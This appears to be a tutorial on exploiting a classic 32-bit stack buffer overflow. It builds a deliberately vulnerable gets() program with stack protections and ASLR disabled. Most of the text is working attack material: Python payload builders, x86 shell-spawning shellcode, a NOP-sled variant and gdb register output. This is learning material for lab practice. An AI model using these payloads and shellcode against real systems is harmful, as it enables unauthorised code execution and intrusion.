# EXPLOITS
## STACK BUFFER OVERFLOW FOR SHELLCODE INJECTION AND EXECUTION
## REQUIRED TO UNDERSTAND : Stack buffer overflow to overwrite registers backups especially to redirect code execution
## Can't work if : 
```
> NX is enabled (because if it's enabled, the stack won't be executable so we can't execute shellcode from the stack)
> ASLR is enabled (because if it's enabled, the address of the buffer will be randomized, then, unless we're really lucky, we won't be able to jump to the buffer because it's address is random, note that it's still possible to exploit even if it's enabled but really hard)
```
## Bypasses protection : 
```
Umm, no protection
```
Okay, how to execute shellcode from a program ??  
We could just place the shellcode in a buffer then jump to the buffer
We have this type of code here :
```c
#include <stdio.h>
...
void <function> //Use another function than main() !!!
{
	char buffer[<BUFFER SIZE>];
	gets(buffer); 
	//I'm not using scanf() because it stops at bad chars, doesn't mean that it can't be overflowed but to keep things simple let's use gets() 
	//(of course it could be another way to create an exploitable stack buffer overflow)
}
...
void main()
{
	...
	<function>();
	...
}
```
So what do we have to modify here ? Well the goal is to place shellcode we want to execute in the buffer then jump to it as well
Basicaly to jump to the stack we have to redirect code execution to set the Instruction Pointer (RIP, EIP or IP) backup to the address of the buffer
There could be another ways to get the buffer address but just to stay simple i'm going to print it then it will be easier to exploit :
```c
#include <stdio.h>
...
void <function> //Use another function than main() !!!
{
	char buffer[<BUFFER SIZE>];
	gets(buffer); 
	//I'm not using scanf() because it stops at bad chars, doesn't mean that it can't be overflowed but to keep things simple let's use gets() 
	//(of course it could be another way to create an exploitable stack buffer overflow)
	printf("Address of buffer : %p\n", buffer); //You could also use gdb to find this but the problem with this debugger is that address are shifted with and without gdb so it will be very annoying to find the address
}
...
void main()
{
	...
	<function>();
	...
}
```
To compile it, you will have to make the stack executable :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -z execstack -m32
```
I also added -m32 flag to compile in 32 bits, it's not required, but it makes exploitation easier, also note that if you compile in 32 bits, you wouldn't be able to execute 64 bits shellcode  
You should also disable ASLR otherwise, the address of the buffer wouldn't be static anymore :
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Or to disable ALSR for the program only :
```bash
setarch `uname -m` -R <executable>
# When you wanna pipe the exploit : python exploit.py | setarch `uname -m` -R <executable>
```

Awesome ! Now let's write the exploit (here i'm using python)
```python
import struct # To convert hex addresses to ascii using struct.pack()
# First we define the shellcode we're gonna inject to the program
shellcode = <Your shellcode> 
# Warning : DON'T USE SHELLCODE WHICH IS BIGGER THAN THE BUFFER SIZE !!! SO if <BUFFER SIZE> = 64 bytes, don't use a shellcode which is longer than 64 bytes (a byte is a character or a binary instruction)
# Example : this one will close the program in ELF32 "\xB8\x01\x00\x00\x00\xBB\x04\x00\x00\x00\xCD\x80"

# Then, we start the payload :
payload = shellcode + '\x90'*(<BUFFER SIZE> - len(shellcode)) 
# Okay, you're maybe confused about what i'm doing here, actually it's simple, first, i put my shellcode in the buffer and just to be sure that the program will not execute bad instructions, i fill all the rest of the buffer with the instruction 0x90 which is actually the NOP insrtruction, which just does nothing, so if the buffer size is 64 bytes and the shellcode is 12 bytes then it will put the shellcode and add 64 - 12 NOPs after it to fill the rest of the buffer

# Okay, now come the offset before overwriting Instruction Pointer, if you don't know how to do this, please see the article about code execution redirection by overwriting instruction pointer backup in the stack (here it's 64 (buffer) + 12 = 76)
payload += "X"*8 # I don't know what i'm overwriting here but it doesn't matter, may differ for you, just have to find the good offset exactly before overwriting the instruction pointer backup
payload += "B"*4 # EBP backup

# Now the instruction pointer backup that we will set to the address of the buffer :
payload += struct.pack("I", <buffer address>) # It's "Q" instead of "I" in 64 bits
# I did already say it before but the buffer address is printed in this case, but it could be not

# All is ready ! Now print the exploit payload :
print(payload)
```
The code is fair enough so i don't have to explain  
Now to use the exploit :
```bash
python exploit.py | ./vuln
# If for example you used the shellcode that exits the program and you don't get a segmentation fault, it means that it worked
# If you used a shellcode to spawn a shell and it doesn't work it's either that it gives a segmentation fault without opening anything or it actually opens the shell but closing it, to solve this problem you can use this command :
(python exploit.py ; cat) | ./vuln
```

Exemple shellcode in x86 ELF, it will spawn a shell ! :
```python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80" 
```
Hope that it works, if you have any problems, please ask them here, on github, i personally spent 10 hours having a problem related to the fact that the instruction pointer was overwrote with shellcode, but i was using a different type of exploit, in theory, this will work

But... What if the stack is not executable ?...  
How can we get a shell...  
You should look at ret2libc that is an exploitation technique which can bypass NX !
### Exploitation without buffer address leak
If the program doesn't print the address of the buffer then you could use gdb to find it, but there's an issue, gdb will actually offset the addresses, it sucks, but there's a little trick to fix that  
The trick is to not place our shellcode in the buffer but directly in the stack after the instruction pointer backup, and it's also used if there's we lack of space for our shellcode in the buffer  
But before our shellcode, we have to place a loooooot of NOPs and we will jump to `ESP` (which can be obtained using gdb which points to the buffer) + `500` since our nopslide size is around `1000`, NOP is an instruction (`0x90`) which does nothing, so when it will jump to a NOP, it will jump to the other one which follows it then the next one and so forth until it reachs the shellcode, so let's get `ESP` value just after the `gets` function gets called (yes it's a weird sentence) using gdb :
```
gdb <executable>
disass vuln
```
```nasm
Dump of assembler code for function vuln:
   0x08049172 <+0>:	push   ebp
   0x08049173 <+1>:	mov    ebp,esp
   0x08049175 <+3>:	push   ebx
   0x08049176 <+4>:	sub    esp,0x44
   0x08049179 <+7>:	call   0x80490b0 <__x86.get_pc_thunk.bx>
   0x0804917e <+12>:	add    ebx,0x2e82
   0x08049184 <+18>:	sub    esp,0x8
   0x08049187 <+21>:	lea    eax,[ebp-0x48]
   0x0804918a <+24>:	push   eax
   0x0804918b <+25>:	lea    eax,[ebx-0x1ff8]
   0x08049191 <+31>:	push   eax
   0x08049192 <+32>:	call   0x8049030 <printf@plt>
   0x08049197 <+37>:	add    esp,0x10
   0x0804919a <+40>:	sub    esp,0xc
   0x0804919d <+43>:	lea    eax,[ebp-0x48]
   0x080491a0 <+46>:	push   eax
   0x080491a1 <+47>:	call   0x8049040 <gets@plt>
   0x080491a6 <+52>:	add    esp,0x10 
   0x080491a9 <+55>:	nop <------------------------
   0x080491aa <+56>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080491ad <+59>:	leave  
   0x080491ae <+60>:	ret 
End of assembler dump.
```
I will set a breakpoint at the `nop` instruction at `0x080491a9`, it's just after the call to `gets` and something with `ESP` :
```
b *0x080491a9
```
Now let's run :
```
run
```
We can enter any string for our input function and we hit the breakpoint, now let's print all the registers :
```
info registers
```
```
eax            0xffffd040          0xffffd040
ecx            0xf7fa4580          0xf7fa4580
edx            0xfbad2288          0xfbad2288
ebx            0x804c000           0x804c000
esp            0xffffd040          0xffffd040 <----------------------
ebp            0xffffd088          0xffffd088
esi            0xf7fa4000          0xf7fa4000
edi            0xf7fa4000          0xf7fa4000
eip            0x80491a9           0x80491a9 <vuln+55>
eflags         0x282               [ SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
```
Now `ESP` points to the buffer at `0xffffd040`, oh and you can also see that `EAX` also points to the buffer, that's actually because the `gets` function returns the address where it wrote the string but it's not important for us  
Now in the actual exploit :
```python
import struct

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80" 
#shellcode = "\xCC"*4
payload = "A"*64
payload += "X"*8
payload += "B"*4 # EBP backup
payload += struct.pack("I", 0xffffd040+500) # buffer address + 500 (which is in the nopslide)
payload += "\x90"*1000
payload += shellcode
print(payload)
```
You can see what i did, i jumped to an address which is in the nopslide which is 1000 NOPS length  
So if we run this, it should work, if it's not working, you can extend the nopslide or/and change the `buffer address + 500` by a bigger number
